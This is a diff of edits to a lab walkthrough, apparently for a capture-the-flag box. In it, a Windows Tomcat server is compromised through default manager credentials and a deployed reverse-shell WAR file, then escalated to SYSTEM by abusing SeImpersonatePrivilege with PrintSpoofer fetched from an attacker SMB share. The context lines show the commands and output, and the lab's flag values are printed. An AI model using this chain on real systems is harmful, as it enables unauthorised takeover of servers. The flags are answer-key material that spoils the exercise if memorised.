@@ -14,9 +14,9 @@ A Tomcat instance is found running with its default `admin:tomcat` credentials. 
 
 ## Enumeration
 
-### Port Scanning
+### Port Enumeration
 
-A full TCP port scan is run first:
+A full TCP port scan comes first:
 
 ```bash
 $ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn war.nyx
@@ -37,7 +37,7 @@ PORT      STATE SERVICE       REASON
 MAC Address: 08:00:27:E7:4A:FD (Oracle VirtualBox virtual NIC)
 ```
 
-A version/script scan against the open ports fills in the details — a typical Windows spread of RPC/SMB ports, plus Tomcat on 8080:
+A version and script scan on the open ports fills in the details — a typical Windows spread of RPC/SMB ports, plus Tomcat on 8080:
 
 ```bash
 $ sudo nmap -p 135,139,445,5040,8080,49664,49665,49666,49667,49668,49669,49670 -sCV war.nyx
@@ -76,6 +76,7 @@ Host script results:
 ```
 http://war.nyx:8080
 ```
+
 <img src="../Images/war/Pasted image 20260721224641.png"/>
 
 This is a Tomcat instance, and its manager interface is worth trying default credentials against:
@@ -99,11 +100,12 @@ Payload size: 1087 bytes
 Final size of war file: 1087 bytes
 Saved as: rev_shell.war
 ```
+
 <img src="../Images/war/Pasted image 20260721204443.png"/>
 
 The resulting `rev_shell.war` is uploaded through the Tomcat Manager's "WAR file to deploy" form and deployed under its own context path, `/rev_shell` — matching the filename minus the extension, as Tomcat does by default when no context path is specified.
 
-The deployed app is requested to trigger the shell:
+Requesting the deployed app triggers the shell:
 
 ```
 http://war.nyx:8080/rev_shell
@@ -151,7 +153,7 @@ SeTimeZonePrivilege           Change the time zone                      Disabled
 
 > **Privileges:** `SeImpersonatePrivilege`
 
-Service accounts commonly hold this privilege, and it's the basis for the whole "Potato" family of Windows privilege escalation techniques: it allows the current process to impersonate any token it can get its hands on, and several Windows services can be coerced into authenticating as SYSTEM over a local named pipe — at which point that SYSTEM token becomes available to impersonate.
+Service accounts commonly hold this privilege, and it's the basis for the whole "Potato" family of Windows privilege escalation techniques: it lets the current process impersonate any token it can get its hands on, and several Windows services can be coerced into authenticating as SYSTEM over a local named pipe — at which point that SYSTEM token becomes available to impersonate.
 
 ```cmd
 C:\> systeminfo
@@ -206,7 +208,7 @@ Network Card(s):               1 NIC(s) Installed.
 Hyper-V Requirements:          A hypervisor has been detected. Features required for Hyper-V will not be displayed.
 ```
 
-`PrintSpoofer` — one implementation of this technique, targeting the Print Spooler service specifically — is transferred over from the attacker machine. An SMB server hosts it, and the target pulls it down:
+`PrintSpoofer` — one implementation of this technique, targeting the Print Spooler service specifically — has to reach the box. An SMB server on the attacker machine hosts it, and the target pulls it down:
 
 ```bash
 # Attacker Machine
@@ -251,6 +253,8 @@ whoami
 nt authority\system
 ```
 
+With a SYSTEM shell, both flags are readable — `low`'s `user.txt` and the Administrator's `root.txt`:
+
 ```cmd
 C:\Windows\system32> dir C:\Users
 dir C:\Users
@@ -269,19 +273,6 @@ dir C:\Users
 ```
 
 ```cmd
-C:\Windows\system32> dir C:\Users\low\Desktop
-dir C:\Users\low\Desktop
- Volume in drive C has no label.
- Volume Serial Number is 380E-880B
-
- Directory of C:\Users\low\Desktop
-
-12/06/2024  05:33 PM    <DIR>          .
-12/06/2024  05:33 PM    <DIR>          ..
-12/06/2024  05:23 PM                35 user.txt
-               1 File(s)             35 bytes
-               2 Dir(s)  32,622,415,872 bytes free
-
 C:\Windows\system32> type C:\Users\low\Desktop\user.txt
 type C:\Users\low\Desktop\user.txt
 3a1ddb915bd423f0ca428dce35612dcb
@@ -290,25 +281,11 @@ type C:\Users\low\Desktop\user.txt
 > **User flag:** `3a1ddb915bd423f0ca428dce35612dcb`
 
 ```cmd
-C:\Windows\system32> dir C:\Users\Administrator\Desktop
-dir C:\Users\Administrator\Desktop
- Volume in drive C has no label.
- Volume Serial Number is 380E-880B
-
- Directory of C:\Users\Administrator\Desktop
-
-12/06/2024  05:32 PM    <DIR>          .
-12/06/2024  05:32 PM    <DIR>          ..
-12/06/2024  05:30 PM                35 root.txt
-               1 File(s)             35 bytes
-               2 Dir(s)  32,622,415,872 bytes free
-
 C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
 type C:\Users\Administrator\Desktop\root.txt
 1399d5ba705df14146335def4ff64520
-
-C:\Windows\system32>
 ```
+
 > **Root flag:** `1399d5ba705df14146335def4ff64520`
 
 ## Takeaways
